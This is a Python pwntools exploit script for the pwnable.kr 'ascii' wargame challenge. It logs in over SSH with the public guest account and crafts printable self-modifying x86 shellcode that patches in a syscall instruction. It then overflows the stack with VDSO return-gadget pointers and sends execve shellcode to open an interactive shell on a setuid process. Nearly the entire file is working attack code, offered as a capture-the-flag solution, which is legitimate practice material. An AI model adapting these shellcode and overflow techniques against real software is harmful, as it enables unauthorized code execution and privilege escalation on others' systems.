from pwn import *

user     = 'ascii'
binary   = '/home/%s/%s' % (user,user)
chal     = os.path.basename(binary)
shell    = ssh(user, 'pwnable.kr', password='guest', port=2222)

if not os.path.exists(chal):
    shell.download_file(binary)
    os.chmod(chal, 0755)

#
# Our shellcode has to be a bit crafty
#
# We just did a 'ret' to get to our shellcode at 0x8000000a.
#
# All we want to do is get a syscall like:
#   read(0, 0x80000000, 1024)
#
# This requires writing in an 'int 0x80' somewhere, which has two bytes
# that we can't actually do anything with.
#
shellcode = asm('''
  /* the last thing on the stack is this current address.
     save it into ESI for indexing */
    dec esp
    dec esp
    dec esp
    dec esp
    pop esi

  /* set eax = 0 */
    push 0x44
    pop  eax
    xor  al, 0x44

  /* set ebx = 0 = STDIN */
    push eax
    pop  ebx

  /* set ecx = buffer */
    push esi
    pop  ecx

  /* set edx = -1 */
    push eax
    pop  edx
    dec  edx

  /* write in our 0xcd 0x80 */
    .fill 7, 1, 0x47 /* Pad offset from the beginning */
    xor [esi+0x20], dx

  /* set eax = SYS_read */
    xor al, 0x44 ^ SYS_read
    xor al, 0x44

  /* syscall */
  .byte 0xcd ^ 0xff
  .byte 0x80 ^ 0xff
''')

log.info(disasm(shellcode))

# Build our payload!
#
payload = shellcode

while len(payload) % 4:
  payload += 'X'

# Just overflow with pointers to 'ret' in the VDSO.
# pwndbg> x/i 0x55555000+0x443
#    0x55555443 <__kernel_vsyscall+19>:   ret
ret = 0x55555443 if args['LOCAL'] else 0x55557565

#
# Normally on the stack, there's a pointer to our buffer hanging around.
#
# Before overwrite:
# 3a:00e8|      0xffac9358 --> 0x80000000 <-- popal   /* 0x61616161; 'aaaabaaacaaadaaaeaaaf...' */
#
# After overwrite:
# 0b:002c|      0xffac9358 <-- 'eaacfaacgaachaaciaacj...'
#
#
ptr_offset = cyclic_find('eaac')
while len(payload) < ptr_offset:
    payload += pack(ret)

# Need to terminate getchar() loop.
# This byte will overwrite the LSB of 0x80000000
# so it may as well be zero.
payload += '\x00'

log.hexdump(payload)

if args['LOCAL']:
  p = process('./ascii', aslr=0, setuid=1)
else:
  p = shell.process('./ascii', aslr=0, setuid=1)
p.send(payload)

# Wait for read() to get hit
sleep(2)

p.send('\x90' * 0x40 + asm(shellcraft.sh()))
p.interactive()

